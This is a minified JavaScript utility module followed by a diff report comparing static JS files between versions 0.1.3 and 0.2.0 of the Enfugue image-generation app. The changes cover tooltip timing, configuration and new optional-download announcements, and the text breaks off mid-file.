randomInt=(e,t)=>(void 0===t?0:e)+Math.random()*(void 0===t?e:t-e)|0;export let randomHex=e=>isEmpty(e)?randomInt(16).toString(16):new Array(e).fill(null).map(randomHex).join("");export let randomChoice=e=>e[randomInt(e.length)];export let uuid=()=>`${randomHex(8)}-${randomHex(4)}-4${randomHex(3)}-${randomChoice(["8","9","a","b"])}${randomHex(3)}-${randomHex(12)}`;export let isEquivalent=(e,t)=>{if(typeof e==typeof t){if(Array.isArray(e)&&Array.isArray(t)){if(e.length!==t.length)return!1;for(let r=0;r<e.length;r++)if(!isEquivalent(e[r],t[r]))return!1;return!0}if("object"==typeof e){if(null===e)return null===t;if(null===t)return!1;let r=Object.getOwnPropertyNames(e),o=Object.getOwnPropertyNames(t);if(!isEquivalent(r,o))return!1;for(let o of r)if(!isEquivalent(e[o],t[o]))return!1;return!0}return e===t}return!1};export let getQueryParameters=()=>-1===window.location.href.indexOf("?")?{}:window.location.href.substring(window.location.href.indexOf("?")+1).split("&").reduce(((e,t)=>{let r=t.split("="),o=r[0],n=decodeURIComponent(r[1]).replace("+"," ");return e.hasOwnProperty(o)?(Array.isArray(e[o])||(e[o]=[e[o]]),e[o].push(n)):e[o]=n,e}),{});export let getDataParameters=e=>{let t={};for(let r=0,o=e.attributes,n=o.length;r<n;r++)o[r].nodeName.startsWith("data")&&(t[camelCase(o[r].nodeName.substr(5))]=o[r].nodeValue);return t};export let buildQueryURL=(e,t)=>{let r=e;return-1===e.indexOf("?")&&(r+="?"),r+Object.getOwnPropertyNames(t).map((e=>`${e}=${encodeURIComponent(t[e])}`)).join("&")};export let getQueryURL=e=>buildQueryURL(window.location.href,e);export let isEmpty=e=>null==e||""===e||"null"===e||Array.isArray(e)&&0===e.length||"object"==typeof e&&"Object"===e.constructor.name&&0===Object.getOwnPropertyNames(e).length;export let removeEmpty=e=>{if(Array.isArray(e)){let t=[];for(let r of e)isEmpty(v)||t.push(v);return t}if("object"==typeof e){let t={};for(let r of Object.getOwnPropertyNames(e))isEmpty(e[r])||(t[r]=e[r]);return t}return e};export let deepClone=(e,t=!0)=>{if(null==e)return e;if("function"==typeof e){if(t)throw"Cannot clone functions.";return e}return"boolean"==typeof e?!!e:"number"==typeof e?0+e:"string"==typeof e||e instanceof String?`${e}`:Array.isArray(e)?new Array(e.length).fill(null).map(((t,r)=>deepClone(e[r],!1))):"object"==typeof e||e===Object(e)?"RegExp"===e.constructor.name?e:Object.getOwnPropertyNames(e).reduce(((t,r)=>(t[r]=deepClone(e[r],!1),t)),new Object):(console.warn("Unknown clone type for",e),e)};const byteSuffixes=["B","KB","MB","GB","TB","PB","EB","ZB","YB"];export let humanSize=(e,t)=>{void 0===t&&(t=2);let r=0;for(;e>1e3;)e/=1e3,r++;return`${e.toFixed(t)} ${byteSuffixes[r]}`};const secondsPerMinute=60,secondsPerHour=3600,secondsPerDay=86400;export let humanDuration=(e,t=!0)=>{let r=0,o=0,n=0;e>86400&&(r=Math.floor(e/86400),e-=86400*r),e>3600&&(o=Math.floor(e/3600),e-=3600*o),e>60&&(n=Math.floor(e/60),e-=60*n);let l=`${r} day${1!=r?"s":""}, ${o} hour${1!=o?"s":""}, ${n} minute${1!=n?"s":""}, ${e=Math.floor(e)} second${1!=e?"s":""}`;if(t&&0==r){let e=l.split(", ");return 0==o&&0==n?e.slice(3).join(", "):0==o?e.slice(2).join(", "):e.slice(1).join(", ")}return l};export let getCookies=()=>document.cookie.split(";").reduce(((e,t)=>{let r=strip(t).split("=");return e[r[0]]=r[1],e}),{});export let getCookie=e=>getCookies()[e];export let jaroWinkler=(e,t,r)=>{let o,n,l=0;if(0===e.length||0===t.length)return 0;if(e===t)return 1;let s=Math.floor(Math.max(e.length,t.length)/2)-1,a=new Array(e.length),i=new Array(t.length);for(o=0;o<e.length;o++){let r=o>=s?o-s:0,u=o+s<=t.length-1?o+s:t.length-1;for(n=r;n<=u;n++)if(!0!==a[o]&&!0!==i[n]&&e[o]===t[n]){++l,a[o]=i[n]=!0;break}}if(0===l)return 0;let u=0,p=0;for(o=0;o<e.length;o++)if(!0===a[o]){for(n=u;n<t.length;n++)if(!0===i[n]){u=n+1;break}e[o]!==t[n]&&++p}let c=(l/e.length+l/t.length+(l-p/2)/l)/3,f=0;if(null==r&&(r=.1),c>.7){for(;e[f]===t[f]&&f<4;)++f;c+=f*r*(1-c)}return c};export let getPermutations=e=>{let t,r,o=e.length,n=[e.slice()],l=new Array(o).fill(0),s=1;for(;s<o;)l[s]<s?(t=s%2&&l[s],r=e[s],e[s]=e[t],e[t]=r,++l[s],s=1,n.push(e.slice())):(l[s]=0,++s);return n};export let permutedSentenceJaroWinkler=(e,t)=>{let r=0;for(let o of getPermutations(e.split(" ")))for(let e of getPermutations(t.split(" ")))r=Math.max(r,jaroWinkler(o.join(" "),e.join(" ")));return r};export let ceilingTo=(e,t)=>Math.ceil(e/t)*t;export let floorTo=(e,t)=>Math.floor(e/t)*t;export let roundTo=(e,t)=>Math.round(e/t)*t;export let roundToFactor=(e,t)=>roundTo(e,10**t);export let roundToPrecision=(e,t)=>{return r=10**t,Math.round(e*r)/r;var r};export let clamp=(e,t=0,r=1)=>Math.max(Math.min(isNaN(e)?0:e,r),t);export let parseSelector=e=>{let t={};return e.split(/(?=\.)|(?=#)|(?=\[)/).forEach((e=>{switch(e[0]){case"#":void 0===t.ids&&(t.ids=[]),t.ids.push(e.slice(1));break;case".":void 0===t.classes&&(t.classes=[]),t.classes.push(e.slice(1));break;case"[":void 0===t.attributes&&(t.attributes={});let[r,o]=e.slice(1,-1).split("=");t.attributes[r]=strip(o);break;default:void 0===t.tags&&(t.tags=[]),t.tags.push(e)}})),t};export function*shiftingFrameIterator(e,t){for(let r=0;r<e.length-t+1;r++)yield e.slice(r,r+t)}export function*zip(...e){let t=Math.min(...e.map((e=>e.length)));for(let r=0;r<t;r++)yield e.map((e=>e[r]))}export let hslToRgb=(e,t,r)=>{let o,n,l;if(0===t)o=n=l=r;else{let s=(e,t,r)=>(r<0&&(r+=1),r>1&&(r-=1),r<1/6?e+6*(t-e)*r:r<.5?t:r<2/3?e+(t-e)*(2/3-r)*6:e),a=r<.5?r*(1+t):r+t-r*t,i=2*r-a;o=s(i,a,e+1/3),n=s(i,a,e),l=s(i,a,e-1/3)}return[Math.round(255*o),Math.round(255*n),Math.round(255*l)]};export let rgbToHsl=(e,t,r)=>{e/=255,t/=255,r/=255;let o,n,l=Math.max(e,t,r),s=Math.min(e,t,r),a=(l+s)/2;if(l===s)o=n=0;else{let i=l-s;switch(n=a>.5?i/(2-l-s):i/(l+s),l){case e:o=(t-r)/i+(t<r?6:0);break;case t:o=(r-e)/i+2;break;case r:o=(e-t)/i+4}o/=6}return[o,n,a]};export let rgbToHex=(e,t,r)=>{let o=e=>(e<16?"0":"")+e.toString(16);return`#${o(e)}${o(t)}${o(r)}`};export let hslToHex=(e,t,r)=>rgbToHex(...hslToRgb(e,t,r));export let hexToRgb=e=>(e.startsWith("#")&&(e=e.substr(1)),[parseInt(e.substr(0,2),16),parseInt(e.substr(2,2),16),parseInt(e.substr(4),16)]);export let hexToHsl=e=>rgbToHsl(...hexToRgb(e));const pluralRules=new Intl.PluralRules("en-US",{type:"ordinal"}),suffixes=new Map([["one","st"],["two","nd"],["few","rd"],["other","th"]]);export let formatOrdinal=e=>`${e}${suffixes.get(pluralRules.select(e))}`;export let promptFiles=(e="*",t=!1)=>new Promise(((r,o)=>{let n=document.createElement("input"),l=e=>{window.removeEventListener("mousemove",l),o("No files selected.")};n.type="file",n.multiple=t,n.accept=e,n.onchange=()=>{let e=Array.from(n.files);window.removeEventListener("mousemove",l),r(t?e:e[0])},n.click(),window.addEventListener("mousemove",l)}));export let stripHTML=e=>e.replace(/<[^>]*>?/gm,"");export let cleanHTML=e=>e.replace("<","&lt;").replace(">","&gt;");export let createElementsFromString=e=>{let t=document.createElement("div");return t.innerHTML=e.trim(),t.childNodes};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/base/loader.mjs` & `enfugue-0.2.0/enfugue/static/js/base/loader.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/base/publisher.mjs` & `enfugue-0.2.0/enfugue/static/js/base/publisher.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/base/session.mjs` & `enfugue-0.2.0/enfugue/static/js/base/session.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/base/watcher.mjs` & `enfugue-0.2.0/enfugue/static/js/base/watcher.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/common/event-tracker.mjs` & `enfugue-0.2.0/enfugue/static/js/common/event-tracker.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/common/history.mjs` & `enfugue-0.2.0/enfugue/static/js/common/history.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/common/shadowbox.mjs` & `enfugue-0.2.0/enfugue/static/js/common/shadowbox.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/common/tooltip.mjs` & `enfugue-0.2.0/enfugue/static/js/common/tooltip.mjs`

 * *Files 7% similar despite different names*

```diff
@@ -1 +1 @@
-import{DOMWatcher}from"../base/watcher.mjs";import{ElementBuilder}from"../base/builder.mjs";const trackingConfiguration={name:"Tooltip tracker",childList:!0,subtree:!0,attributes:!0,debug:!1,containerClassName:"tooltip-container"},E=new ElementBuilder,offsetConfiguration={x:10,y:10},activationDelay=150,checkInterval=100;let enableTimer,checkIntervalTimer;class TooltipHelper extends DOMWatcher{constructor(t){void 0===t&&(t=trackingConfiguration),t.initialize=!1,super(t),this.filterFunction=this.tooltipFilter,this.initializeFunction=this.tooltipInitialize,this.updateFunction=this.tooltipUpdate,this.tooltipContainer=E.div().class(t.containerClassName||trackingConfiguration.containerClassName),document.body.appendChild(this.tooltipContainer.render()),this.initialize()}tooltipUpdate(t){t==this.tooltipNode&&this.tooltipContainer.content(t.getAttribute("data-tooltip"))}tooltipFilter(t){return t instanceof HTMLElement&&t.hasAttribute("data-tooltip")}tooltipInitialize(t){if(t.hasAttribute("data-tooltip-initialized"))return;let e=this,i=function(t,i){window.requestAnimationFrame((()=>{let o=e.tooltipContainer,n=window.innerWidth,a=window.innerHeight;t>n/2?(o.css("left",null),o.css("right",n-t+offsetConfiguration.x)):(o.css("right",null),o.css("left",t+offsetConfiguration.x)),i>a/2?(o.css("top",null),o.css("bottom",a-i+offsetConfiguration.y)):(o.css("bottom",null),o.css("top",i+offsetConfiguration.y))}))},o=function(){e.tooltipContainer.addClass("active"),checkIntervalTimer=setInterval((()=>{e.watchedNode.contains(t)||n()}),100)},n=function(){e.tooltipNode=null,e.tooltipContainer.removeClass("active"),clearInterval(checkIntervalTimer)},a=function(t){i(t.clientX,t.clientY)},r=function(t){clearTimeout(enableTimer),n(),window.removeEventListener("touchstart",r)};t.addEventListener("mouseenter",(function(n){e.tooltipNode=t,e.tooltipContainer.content(t.getAttribute("data-tooltip")),i(n.clientX,n.clientY),enableTimer=setTimeout(o,150),t.addEventListener("mousemove",a)})),t.addEventListener("mouseleave",(function(e){clearTimeout(enableTimer),n(),t.removeEventListener("mousemove",a)})),t.addEventListener("touchstart",(function(n){n.stopPropagation(),n.preventDefault(),e.tooltipNode=t,e.tooltipContainer.content(t.getAttribute("data-tooltip")),i(n.touches[0].clientX,n.touches[0].clientY),enableTimer=setTimeout(o,150),window.addEventListener("touchstart",r)})),t.setAttribute("data-tooltip-initialized",(new Date).getTime())}}export{TooltipHelper};
+import{DOMWatcher}from"../base/watcher.mjs";import{ElementBuilder}from"../base/builder.mjs";const trackingConfiguration={name:"Tooltip tracker",childList:!0,subtree:!0,attributes:!0,debug:!1,containerClassName:"tooltip-container"},E=new ElementBuilder,offsetConfiguration={x:10,y:10},activationDelay=150,checkInterval=100;let enableTimer,checkIntervalTimer;class TooltipHelper extends DOMWatcher{constructor(t){void 0===t&&(t=trackingConfiguration),t.initialize=!1,super(t),this.filterFunction=this.tooltipFilter,this.initializeFunction=this.tooltipInitialize,this.updateFunction=this.tooltipUpdate,this.tooltipContainer=E.div().class(t.containerClassName||trackingConfiguration.containerClassName),document.body.appendChild(this.tooltipContainer.render()),this.initialize()}tooltipUpdate(t){t==this.tooltipNode&&this.tooltipContainer.content(t.getAttribute("data-tooltip"))}tooltipFilter(t){return t instanceof HTMLElement&&t.hasAttribute("data-tooltip")}tooltipInitialize(t){if(t.hasAttribute("data-tooltip-initialized"))return;let e=this,i=function(t,i){window.requestAnimationFrame((()=>{let o=e.tooltipContainer,n=window.innerWidth,a=window.innerHeight;t>n/2?(o.css("left",null),o.css("right",n-t+offsetConfiguration.x)):(o.css("right",null),o.css("left",t+offsetConfiguration.x)),i>a/2?(o.css("top",null),o.css("bottom",a-i+offsetConfiguration.y)):(o.css("bottom",null),o.css("top",i+offsetConfiguration.y))}))},o=function(){clearInterval(checkIntervalTimer),e.tooltipContainer.addClass("active"),checkIntervalTimer=setInterval((()=>{let i=null===e.tooltipTime?0:(new Date).getTime()-e.tooltipTime;!e.watchedNode.contains(t)&&i>1e3&&n()}),100)},n=function(){e.tooltipNode=null,e.tooltipContainer.removeClass("active"),clearInterval(checkIntervalTimer)},a=function(t){i(t.clientX,t.clientY)},l=function(t){clearTimeout(enableTimer),n(),window.removeEventListener("touchstart",l)};t.addEventListener("mouseenter",(function(n){e.tooltipTime=(new Date).getTime(),e.tooltipNode=t,e.tooltipContainer.content(t.getAttribute("data-tooltip")),i(n.clientX,n.clientY),enableTimer=setTimeout(o,150),t.addEventListener("mousemove",a)})),t.addEventListener("mouseleave",(function(e){clearTimeout(enableTimer),n(),t.removeEventListener("mousemove",a)})),t.addEventListener("touchstart",(function(n){n.stopPropagation(),n.preventDefault(),e.tooltipNode=t,e.tooltipContainer.content(t.getAttribute("data-tooltip")),i(n.touches[0].clientX,n.touches[0].clientY),enableTimer=setTimeout(o,150),window.addEventListener("touchstart",l)})),t.setAttribute("data-tooltip-initialized",(new Date).getTime())}}export{TooltipHelper};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/config/index.mjs` & `enfugue-0.2.0/enfugue/static/js/config/index.mjs`

 * *Files 11% similar despite different names*

```diff
@@ -1 +1 @@
-let Configuration={debug:!1,controller:{module:"index"},view:{applicationContainer:"enfugue-application",language:"en"},url:{root:"http://dev.enfugue.local/",api:"http://dev.enfugue.local/api/",baseTitle:"Enfugue",titleSeparator:" | "},history:{size:100},model:{cache:0,cookie:{name:"enfugue_token"},status:{interval:1e4},autosave:{interval:3e4},queue:{interval:5e3},downloads:{interval:5e3},invocation:{width:512,height:512,chunkingSize:64,chunkingBlur:64,guidanceScale:7.5,inferenceSteps:50,interval:1e3,upscaleDiffusionSteps:80,upscaleDiffusionGuidanceScale:10,upscaleDiffusionStrength:.15,upscaleDiffusionChunkingSize:64,upscaleDiffusionChunkingBlur:64,errors:{consecutive:2}}}};export{Configuration};
+let Configuration={debug:!1,controller:{module:"index"},view:{applicationContainer:"enfugue-application",language:"en"},url:{root:"http://dev.enfugue.local/",api:"http://dev.enfugue.local/api/",baseTitle:"Enfugue",titleSeparator:" | "},history:{size:100},model:{cache:0,cookie:{name:"enfugue_token"},status:{interval:1e4},autosave:{interval:3e4},queue:{interval:5e3},downloads:{interval:5e3},invocation:{width:512,height:512,engineSize:512,chunkingSize:64,chunkingBlur:64,guidanceScale:7.5,inferenceSteps:50,interval:1e3,upscaleDiffusionSteps:80,upscaleDiffusionGuidanceScale:10,upscaleDiffusionStrength:.15,upscaleDiffusionChunkingSize:64,upscaleDiffusionChunkingBlur:64,errors:{consecutive:2}}}};export{Configuration};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/base.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/base.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/common/announcements.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/common/announcements.mjs`

 * *Files 4% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty,waitFor,humanSize,humanDuration,titleCase}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{Controller}from"../base.mjs";import{View,ParentView}from"../../view/base.mjs";import{TableView}from"../../view/table.mjs";import{FormView}from"../../view/forms/base.mjs";import{ButtonInputView,StringInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder;class AcknowledgeButtonInputView extends ButtonInputView{static className="download-input-view";static defaultValue="I Acknowledge"}class InitializationAnnouncementView extends View{constructor(e,t){super(e),this.directories=t,this.formView=new FormView(e);for(let e in this.directories)this.formView.addInput("Directories",StringInputView,e,titleCase(e),{required:!0,value:this.directories[e]})}async build(){let e=await super.build();return e.append(E.h2().content("Welcome to Enfugue")),e.append(E.p().content("Thank you for downloading Enfugue! I hope you enjoy it. Please read the following brief disclaimers before you begin.")),e.append(E.h3().content("Your Privacy")),e.append(E.p().content("Enfugue does not track usage in any way. Your images, prompts, configurations, and all other details only exist on your computer and are never sent elsewhere over a network or otherwise, unless specifically required by the user.")),e.append(E.p().content(E.span().content("Some resources, such as public model data, is provided by "),E.a().content("Hugging Face").href("https://huggingface.co/").target("_blank"),E.span().content(" and by using this application Enfugue will reach out to their servers to download resources as needed. By doing so, you agree to their "),E.a().content("Privacy Policy").href("https://huggingface.co/privacy").target("_blank"),E.span().content("."))),e.append(E.p().content("Additional resources may be downloaded from other providers at your request. Please review the privacy policy and terms of service of the resource providers stated when these resources are requested.")),e.append(E.h3().content("Terms of Service")),e.append(E.p().content("Enfugue makes no guarantees of this software's functionality, and by continuing you release Enfugue, Benjamin Paine, GitHub, Hugging Face, Stability AI, Runway, CivitAI, and all other parties whose software contributions are employed within Enfugue from any liability of any kind arising from use of the software, including but not limited to wear and tear on your hardware and expenses incurred by consuming bandwidth.")),e.append(E.p().content("Furthermore, you hold all the above parties blameless from any and all liability, damage, loss, and expense (including without limitation reasonable attorney’s fees and court costs) arising from claims against parties that Enfugue, or your use of the same as permitted by this Agreement, infringe the intellectual property rights of a third party.")),e.append(E.p().class("strong").content("Enfugue is and always will be free and open-source software.")),e.append(E.p().content("To support further development, please consider financially supporting it if you are able. Simply click 'About' under 'Help' above to see ways you can help keep Enfugue improving.")),e.append(E.h2().content("Directories")),e.append(E.p().content("Use these fields to specify the directories to use for your installation. These do not need to be solely used by Enfugue, and Enfugue will never delete anything from these directories unless you specifically request.")),e.append(await this.formView.getNode()),e}}class DownloadAnnouncementHeaderView extends View{async build(){let e=await super.build();return e.content(E.h2().content("Downloads"),E.p().content("The following downloads are required by Enfugue to function. They are the base Stable Diffusion models, from which more tuned models are made. These models are used when you are not using any other models, as well as when calculating derived models."),E.p().content("Click 'Download Now' to being downloading them. If you do not download them now, they will be downloaded the first time they are needed.")),e}}class DownloadTableView extends TableView{static canSort=!1;static columns={model:"Model",size:"Size"};static columnFormatters={size:e=>humanSize(e)}}class UpdateAnnouncementHeaderView extends View{static releasesLink="https://github.com/painebenjamin/app.enfugue.ai/releases/";async build(){let e=await super.build();return e.content(E.h2().content("Updates"),E.p().content("An updated version of Enfugue is available. See below for details regarding new features and fixes."),E.p().content(E.span().content("If you are managing your own installation, simply executing "),E.createElement("code").content("pip install enfugue --update"),E.span().content(" will fetch the latest details. If you are using an easy installation, you will need to download the updated package. See below for any additional steps required.")),E.p().class("center").content(E.a().class("button").href(this.constructor.releasesLink).target("_blank").content("Download Now"))),e}}class UpdateAnnouncementView extends View{constructor(e,t){super(e),this.update=t}async build(){let e=await super.build();return e.content(E.h3().content(`Version ${this.update.version}`),E.p().addClass("note").content(`Released ${this.update.release}`),E.p().content(this.update.description)),e}}class AnnouncementsController extends Controller{static announcementsWindowWidth=800;static announcementsWindowHeight=1e3;async checkShowAnnouncements(){let e=await this.model.get("/announcements");if(!isEmpty(e)){let t,n=e.filter((e=>"initialize"===e.type)),o=e.filter((e=>"download"===e.type)),i=e.filter((e=>"update"===e.type)),a=new ParentView(this.config);if(await a.addClass("announcements-view"),!isEmpty(n)){let e=(await a.addChild(InitializationAnnouncementView,n[0].directories)).formView;e.onChange((()=>{t.disable(),e.setError("You must submit directory changes before continuing.")})),e.onSubmit((async n=>{await this.model.post("installation",null,null,{directories:n}),this.notify("info","Success","Directories successfully set."),e.clearError(),e.enable(),t.enable()}))}if(!isEmpty(o)){await a.addChild(DownloadAnnouncementHeaderView);let e=await a.addChild(DownloadTableView,o);e.addButton("Download","fa-solid fa-download",(async t=>{let n=(await e.getNode()).find("tbody").findAll("tr");for(let e of n)e.find("td").getText()==t.model&&e.find("button").disabled(!0).addClass("disabled");this.download("checkpoint",t.url,t.model)}))}if(!isEmpty(i)){await a.addChild(UpdateAnnouncementHeaderView);for(let e of i)await a.addChild(UpdateAnnouncementView,e)}if(!a.isEmpty()){t=await a.addChild(AcknowledgeButtonInputView);let e=await this.spawnWindow("Announcements",a,this.constructor.announcementsWindowWidth,this.constructor.announcementsWindowHeight);if(t.onChange((()=>{e.remove()})),e.onClose((async()=>{await this.model.post("/announcements/snooze")})),!isEmpty(n)){let t=(await e.getNode()).findAll("enfugue-node-button");for(let e of t)e.hide()}}}}async initialize(){this.checkShowAnnouncements(),setInterval((()=>this.checkShowAnnouncements()),864e5)}}export{AnnouncementsController};
+import{isEmpty,waitFor,humanSize,humanDuration,titleCase}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{Controller}from"../base.mjs";import{View,ParentView}from"../../view/base.mjs";import{TableView}from"../../view/table.mjs";import{FormView}from"../../view/forms/base.mjs";import{ButtonInputView,StringInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder;class AcknowledgeButtonInputView extends ButtonInputView{static className="download-input-view";static defaultValue="I Acknowledge"}class InitializationAnnouncementView extends View{constructor(e,t){super(e),this.directories=t,this.formView=new FormView(e);for(let e in this.directories)this.formView.addInput("Directories",StringInputView,e,titleCase(e),{required:!0,value:this.directories[e]})}async build(){let e=await super.build();return e.append(E.h2().content("Welcome to Enfugue")),e.append(E.p().content("Thank you for downloading Enfugue! I hope you enjoy it. Please read the following brief disclaimers before you begin.")),e.append(E.h3().content("Your Privacy")),e.append(E.p().content("Enfugue does not track usage in any way. Your images, prompts, configurations, and all other details only exist on your computer and are never sent elsewhere over a network or otherwise, unless specifically requested by the user.")),e.append(E.p().content(E.span().content("Some resources, such as public model data, is provided by "),E.a().content("Hugging Face").href("https://huggingface.co/").target("_blank"),E.span().content(" and by using this application Enfugue will reach out to their servers to download resources as needed. By doing so, you agree to their "),E.a().content("Privacy Policy").href("https://huggingface.co/privacy").target("_blank"),E.span().content("."))),e.append(E.p().content("Additional resources may be downloaded from other providers at your request. Please review the privacy policy and terms of service of the resource providers stated when these resources are requested.")),e.append(E.h3().content("Terms of Service")),e.append(E.p().content("Enfugue makes no guarantees of this software's functionality, and by continuing you release Enfugue, Benjamin Paine, GitHub, Hugging Face, Stability AI, Runway, CivitAI, and all other parties whose software contributions are employed within Enfugue from any liability of any kind arising from use of the software, including but not limited to wear and tear on your hardware and expenses incurred by consuming bandwidth.")),e.append(E.p().content("Furthermore, you hold all the above parties blameless from any and all liability, damage, loss, and expense (including without limitation reasonable attorney’s fees and court costs) arising from claims against parties that Enfugue, or your use of the same as permitted by this Agreement, infringe the intellectual property rights of a third party.")),e.append(E.p().class("strong").content("Enfugue is and always will be free and open-source software.")),e.append(E.p().content("To support further development, please consider financially supporting it if you are able. Simply click 'About' under 'Help' above to see ways you can help keep Enfugue improving.")),e.append(E.h2().content("Directories")),e.append(E.p().content("Use these fields to specify the directories to use for your installation. These do not need to be solely used by Enfugue, and Enfugue will never delete anything from these directories unless you specifically request.")),e.append(await this.formView.getNode()),e}}class DownloadAnnouncementHeaderView extends View{async build(){let e=await super.build();return e.content(E.h2().content("Downloads"),E.p().content("The following downloads are required by Enfugue to function. They are the base Stable Diffusion models, from which more fine-tuned models are made. These models are used when you are not using any other models, as well as when calculating derived models."),E.p().content("Click the icon in each row to being downloading them. If you do not download them now, they will be downloaded the first time they are needed.")),e}}class OptionalDownloadAnnouncementHeaderView extends View{async build(){let e=await super.build();return e.content(E.h2().content("Optional Downloads"),E.p().content("The following downloads are optional. They are newer, more powerful versions of Stable Diffusion that can be used in Enfugue."),E.p().content("For Stable Diffusion XL, you will require a GPU with at least 12 GB of VRAM."),E.p().content("Click the icon in each row to being downloading them. You can also select the appropriate checkpoint from the checkpoint picker at any time, and the file will be downloaded if it has not yet been.")),e}}class DownloadTableView extends TableView{static canSort=!1;static columns={model:"Model",size:"Size"};static columnFormatters={size:e=>humanSize(e)}}class UpdateAnnouncementHeaderView extends View{static releasesLink="https://github.com/painebenjamin/app.enfugue.ai/releases/";async build(){let e=await super.build();return e.content(E.h2().content("Updates"),E.p().content("An updated version of Enfugue is available. See below for details regarding new features and fixes."),E.p().content(E.span().content("If you are managing your own installation, simply executing "),E.createElement("code").content("pip install enfugue --update"),E.span().content(" will fetch the latest details. If you are using an easy installation, you will need to download the updated package. See below for any additional steps required.")),E.p().class("center").content(E.a().class("button").href(this.constructor.releasesLink).target("_blank").content("Download Now"))),e}}class UpdateAnnouncementView extends View{constructor(e,t){super(e),this.update=t}async build(){let e=await super.build();return e.content(E.h3().content(`Version ${this.update.version}`),E.p().addClass("note").content(`Released ${this.update.release}`),E.p().content(this.update.description)),e}}class AnnouncementsController extends Controller{static announcementsWindowWidth=800;static announcementsWindowHeight=1e3;async checkShowAnnouncements(){let e=await this.model.get("/announcements");if(!isEmpty(e)){let t,n=e.filter((e=>"initialize"===e.type)),o=e.filter((e=>"download"===e.type)),i=e.filter((e=>"optional-download"===e.type)),a=e.filter((e=>"update"===e.type)),s=new ParentView(this.config);if(await s.addClass("announcements-view"),!isEmpty(n)){let e=(await s.addChild(InitializationAnnouncementView,n[0].directories)).formView;e.onChange((()=>{t.disable(),e.setError("You must submit directory changes before continuing.")})),e.onSubmit((async n=>{await this.model.post("installation",null,null,{directories:n}),this.notify("info","Success","Directories successfully set."),e.clearError(),e.enable(),t.enable()}))}if(!isEmpty(o)){await s.addChild(DownloadAnnouncementHeaderView);let e=await s.addChild(DownloadTableView,o);e.addButton("Download","fa-solid fa-download",(async t=>{let n=(await e.getNode()).find("tbody").findAll("tr");for(let e of n)e.find("td").getText()==t.model&&e.find("button").disabled(!0).addClass("disabled");this.download("checkpoint",t.url,t.model)}))}if(!isEmpty(i)){await s.addChild(OptionalDownloadAnnouncementHeaderView);let e=await s.addChild(DownloadTableView,i);e.addButton("Download","fa-solid fa-download",(async t=>{let n=(await e.getNode()).find("tbody").findAll("tr");for(let e of n)e.find("td").getText()==t.model&&e.find("button").disabled(!0).addClass("disabled");this.download("checkpoint",t.url,t.model)}))}if(!isEmpty(a)){await s.addChild(UpdateAnnouncementHeaderView);for(let e of a)await s.addChild(UpdateAnnouncementView,e)}if(!s.isEmpty()){t=await s.addChild(AcknowledgeButtonInputView);let e=await this.spawnWindow("Announcements",s,this.constructor.announcementsWindowWidth,this.constructor.announcementsWindowHeight);if(t.onChange((()=>{e.remove()})),e.onClose((async()=>{await this.model.post("/announcements/snooze")})),!isEmpty(n)){let t=(await e.getNode()).findAll("enfugue-node-button");for(let e of t)e.hide()}}}}async initialize(){this.checkShowAnnouncements(),setInterval((()=>this.checkShowAnnouncements()),864e5)}}export{AnnouncementsController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/common/downloads.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/common/downloads.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/common/invocation.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/common/invocation.mjs`

 * *Files 18% similar despite different names*

```diff
@@ -1 +1 @@
-import{ImageInspectorView}from"../../view/image.mjs";import{isEmpty,isEquivalent,waitFor,humanDuration}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{Controller}from"../base.mjs";const E=new ElementBuilder({invocationLoading:"enfugue-invocation-loading",invocationLoaded:"enfugue-invocation-loaded",invocationDuration:"enfugue-invocation-duration",invocationIterations:"enfugue-invocation-iterations",invocationRemaining:"enfugue-invocation-remaining",invocationSampleChooser:"enfugue-invocation-sample-chooser",invocationSample:"enfugue-invocation-sample",invocationStop:"enfugue-invocation-stop"});class InvocationController extends Controller{static truncatePromptLength=36;constructor(i){super(i),this.kwargs={}}get width(){return this.kwargs.width||this.application.config.model.invocation.width}set width(i){this.width!==i&&this.publish("engineWidthChange",i),this.kwargs.width=i}get height(){return this.kwargs.height||this.application.config.model.invocation.height}set height(i){this.height!==i&&this.publish("engineHeightChange",i),this.kwargs.height=i}get chunkingSize(){return this.kwargs.chunking_size||this.application.config.model.invocation.chunkingSize}set chunkingSize(i){this.chunkingSize!==i&&this.publish("engineChunkingSizeChange",i),this.kwargs.chunking_size=i}get chunkingBlur(){return this.kwargs.chunking_blur||this.application.config.model.invocation.chunkingBlur}set chunkingBlur(i){this.chunkingBlur!==i&&this.publish("engineChunkingBlurChange",i),this.kwargs.chunking_blur=i}get prompt(){return this.kwargs.prompt||""}set prompt(i){this.prompt!==i&&this.publish("enginePromptChange",i),this.kwargs.prompt=i}get negativePrompt(){return this.kwargs.negative_prompt||""}set negativePrompt(i){this.negativePrompt!==i&&this.publish("engineNegativePromptChange",i),this.kwargs.negative_prompt=i}get samples(){return this.kwargs.samples||1}set samples(i){this.samples!==i&&this.publish("engineSamplesChange",i),this.kwargs.samples=i}get seed(){return this.kwargs.seed}set seed(i){this.seed!==i&&this.publish("engineSeedChange",i),this.kwargs.seed=i}get guidanceScale(){return 